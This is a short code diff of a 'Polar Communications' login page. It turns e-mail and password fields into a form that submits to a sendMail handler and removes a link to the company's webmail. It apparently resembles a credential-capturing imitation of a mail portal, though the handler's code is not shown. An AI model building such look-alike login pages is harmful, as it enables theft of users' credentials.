@@ -22,17 +22,23 @@
     <article> 
        <img src="img/Screenshot_2026-05-16_082626-removebg-preview.png" alt="">
     </article>
-    
+
     <div class="main">
        <nav class="welcome"><h2> Welcome to Polar Communications</h2></nav>
 
-       <div class="form" action="">
-            <p>E-mail Address<input type="email" id="email" autofocus></p>
+       <form class="form" onsubmit="sendMail(event)" action="">
+            <p>
+              E-mail Address
+              <input type="email" id="email" name="email" autofocus>
+            </p>
 
-            <p class="password">Password<input type="password" id="password" autofocus></p>
+            <p class="password">
+                Password
+                <input type="password" id="password" name="password" autofocus>
+            </p>
 
-            <a href="https://mail.polarcomm.com/tuxedo/"><button onclick="sendMail()">Login</button></a>
-       </div>
+            <button type="submit">Login</button>
+       </form>
     </div>
 
     <nav class="copyright">
